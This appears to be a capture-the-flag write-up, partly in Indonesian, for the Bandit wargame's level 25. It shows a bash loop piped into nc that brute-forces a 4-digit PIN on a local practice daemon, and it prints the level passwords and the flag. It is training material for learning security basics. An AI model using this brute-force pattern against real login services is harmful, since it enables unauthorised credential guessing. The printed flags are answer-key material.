---
layout: default
level: 25
name_file: level
---

{% include level-section.html %}

# soal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. \
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. \
You do not need to create new connections each time

# solve
```bash
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" | nc localhost 30002
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
# Wrong! Please enter the correct current password and pincode. Try again.
## kita butuh dengan memasukan passowrd bandit24 dan pincode dalam satu baris

echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234" | nc localhost 30002
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
# Wrong! Please enter the correct current password and pincode. Try again.

## disini saya mencoba untuk melakukan looping sederhana
for i in {1000..9999}; do echo $i; done
# 1000
# 1001
# ...

## saya mencoba komubinasikan dengan password bandit24
for i in {1000..9999}; do echo -e "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done
...
# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9997
# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9998
# gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9999

## setelah itu saya mengkombinasikan dengan pass
for i in {1000..9999}; do echo -e "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002
# Wrong! Please enter the correct current password and pincode. Try again.
# Wrong! Please enter the correct current password and pincode. Try again.
# Correct!
# The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

for i in {1000..9999}; do echo -e "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002  | grep -vi wrong
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
# Correct!
# The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

# after i ssh i found the pin
cat .pin
# 9297
```

# flag
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4